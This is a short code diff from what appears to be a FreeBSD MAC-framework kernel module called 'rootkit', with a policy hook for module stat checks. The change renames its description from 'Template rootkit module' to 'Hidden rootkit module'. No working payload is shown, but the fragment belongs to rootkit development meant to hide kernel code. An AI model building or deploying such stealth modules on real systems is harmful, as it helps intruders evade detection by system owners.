@@ -73,5 +73,5 @@ static struct mac_policy_ops rootkit_ops = {
 	.mpo_kld_check_stat	= rootkit_kld_check_stat,
 };
 
-MAC_POLICY_SET(&rootkit_ops, rootkit, "Template rootkit module",
+MAC_POLICY_SET(&rootkit_ops, rootkit, "Hidden rootkit module",
     MPC_LOADTIME_FLAG_UNLOADOK, NULL);
